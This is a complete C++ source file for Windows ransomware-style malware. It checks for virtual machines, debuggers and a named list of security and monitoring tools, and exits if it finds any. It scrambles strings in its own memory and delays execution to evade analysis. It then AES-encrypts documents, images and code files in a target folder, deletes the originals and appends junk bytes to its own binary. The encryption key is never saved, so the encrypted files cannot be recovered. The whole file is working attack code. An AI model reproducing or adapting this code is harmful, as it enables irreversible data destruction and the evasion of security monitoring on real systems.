#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <ctime>
#include <winternl.h>
#include <bcrypt.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "bcrypt.lib")

using namespace std;
namespace fs = std::filesystem;

const vector<string> TARGET_EXTENSIONS = {
    ".docx", ".pdf", ".xls", ".ppt", ".jpg", ".png", ".mp4", ".sql", ".cpp", ".py"
};
const vector<string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys"
};
const string LOG_FOLDER = "logs";

bool is_virtual_machine() {
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors <= 2) return true;
    MEMORYSTATUSEX memstat;
    memstat.dwLength = sizeof(memstat);
    GlobalMemoryStatusEx(&memstat);
    return memstat.ullTotalPhys < (2ULL * 1024 * 1024 * 1024);
}

bool edr_detected() {
    vector<string> suspicious = {
        "xagt.exe", "wireshark.exe", "windbg.exe", "procmon.exe",
        "fiddler.exe", "sysmon.exe", "splunkd.exe", "snort.exe",
        "carbonblack", "sentinelagent"
    };
    DWORD processes[1024], cbNeeded;
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) return false;
    DWORD cProcesses = cbNeeded / sizeof(DWORD);
    for (unsigned int i = 0; i < cProcesses; i++) {
        char szProcessName[MAX_PATH] = "<unknown>";
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess) {
            HMODULE hMod;
            DWORD cbNeededMod;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
                GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName));
                for (const auto& s : suspicious)
                    if (string(szProcessName).find(s) != string::npos)
                        return true;
            }
            CloseHandle(hProcess);
        }
    }
    return false;
}

bool is_debugger_present() {
    return IsDebuggerPresent() == TRUE;
}

void anti_debugging() {
    if (is_debugger_present()) {
        Sleep(15000);  
        exit(1);
    }
}

void mutate_strings_in_memory() {
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) return;

    MODULEINFO mi;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &mi, sizeof(mi))) return;

    BYTE* base = (BYTE*)mi.lpBaseOfDll;
    DWORD size = mi.SizeOfImage;

    BYTE* start = base;
    BYTE* end = base + size;

    for (BYTE* p = start; p < end - 4; ++p) {
        if (isprint(p[0]) && isprint(p[1]) && isprint(p[2]) && isprint(p[3])) {
            int len = 0;
            while (len < 50 && p[len] != 0 && isprint(p[len])) len++;

            if (len > 4) {
                int idx = rand() % len;

                if (isalpha(p[idx])) {
                    char original = p[idx];
                    char new_char = 'a' + (rand() % 26);
                    if (isupper(original)) new_char = toupper(new_char);

                    DWORD oldProtect;
                    if (VirtualProtect(p + idx, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                        p[idx] = new_char;
                        VirtualProtect(p + idx, 1, oldProtect, &oldProtect);
                    }
                }
                p += len; 
            }
        }
    }
}

bool should_encrypt(const string& filename) {
    for (const auto& ex : EXCLUDE_KEYWORDS)
        if (filename.find(ex) != string::npos)
            return false;
    for (const auto& ext : TARGET_EXTENSIONS)
        if (filename.size() >= ext.size() && filename.compare(filename.size() - ext.size(), ext.size(), ext) == 0)
            return true;
    return false;
}

string random_suffix(int length = 6) {
    string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    string s;
    srand((unsigned int)time(NULL));
    for (int i = 0; i < length; ++i)
        s += chars[rand() % chars.length()];
    return s;
}

void mutate_self() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    ofstream fout(path, ios::app | ios::binary);
    if (!fout) return;
    fout << "\n<!-- MUTATION_MARKER -->";
    for (int i = 0; i < 64; ++i) {
        char byte = rand() % 255;
        fout.write(&byte, 1);
    }
    fout.close();
}

bool encrypt_buffer_aes(vector<BYTE>& data, BCRYPT_KEY_HANDLE hKey, PUCHAR iv, ULONG ivLen) {
    ULONG outLen = 0, finalLen = 0;
    if (BCryptEncrypt(hKey, data.data(), (ULONG)data.size(), NULL, iv, ivLen, NULL, 0, &outLen, BCRYPT_BLOCK_PADDING) != 0)
        return false;
    vector<BYTE> encrypted(outLen);
    if (BCryptEncrypt(hKey, data.data(), (ULONG)data.size(), NULL, iv, ivLen, encrypted.data(), outLen, &finalLen, BCRYPT_BLOCK_PADDING) != 0)
        return false;
    data = encrypted;
    return true;
}

void real_encrypt_file(const string& filepath, BCRYPT_KEY_HANDLE hKey, PUCHAR iv, ULONG ivLen) {
    ifstream in(filepath, ios::binary);
    if (!in) return;
    vector<BYTE> content((istreambuf_iterator<char>(in)), istreambuf_iterator<char>());
    in.close();

    if (!encrypt_buffer_aes(content, hKey, iv, ivLen)) return;

    string suffix = random_suffix();
    string newname = filepath + "." + suffix;
    ofstream out(newname, ios::binary);
    out.write((char*)content.data(), content.size());
    out.close();

    remove(filepath.c_str());

    fs::create_directory(LOG_FOLDER);
    ofstream log(LOG_FOLDER + "/" + suffix + ".log", ios::app);
    log << filepath << "\n";
    log.close();
}

void encrypt_directory(const string& root, BCRYPT_KEY_HANDLE hKey, PUCHAR iv, ULONG ivLen) {
    for (const auto& entry : fs::recursive_directory_iterator(root)) {
        if (entry.is_regular_file()) {
            string path = entry.path().string();
            if (should_encrypt(path))
                real_encrypt_file(path, hKey, iv, ivLen);
        }
    }
}

int main() {
    anti_debugging();

    if (is_virtual_machine()) {
        cout << "[!] VM detected. Exiting.\n";
        return 1;
    }

    if (edr_detected()) {
        cout << "[!] EDR detected. Exiting.\n";
        return 1;
    }

    mutate_strings_in_memory();

    using NtDelayExecutionFunc = NTSTATUS(WINAPI*)(BOOLEAN, PLARGE_INTEGER);
    NtDelayExecutionFunc pNtDelay = (NtDelayExecutionFunc)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
    if (pNtDelay) {
        LARGE_INTEGER delay;
        delay.QuadPart = -10000 * (5000 + rand() % 5000);
        pNtDelay(FALSE, &delay);
    } else {
        Sleep(8000);
    }

    BCRYPT_ALG_HANDLE hAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    PUCHAR keyObj = NULL;
    ULONG keyObjLen = 0, dataLen = 0;
    UCHAR key[32];
    UCHAR iv[16];

    if (BCryptOpenAlgorithmProvider(&hAes, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 1;
    if (BCryptGetProperty(hAes, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjLen, sizeof(ULONG), &dataLen, 0) != 0) return 1;
    keyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, keyObjLen);
    if (!keyObj) return 1;

    BCryptGenRandom(NULL, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(NULL, iv, sizeof(iv), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (BCryptGenerateSymmetricKey(hAes, &hKey, keyObj, keyObjLen, key, sizeof(key), 0) != 0) return 1;

    string target_dir = "C:\\TestEncrypt";
    encrypt_directory(target_dir, hKey, iv, sizeof(iv));

    mutate_self();

    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, keyObj);
    BCryptCloseAlgorithmProvider(hAes, 0);

    cout << "[+] Check\n";
    return 0;
}
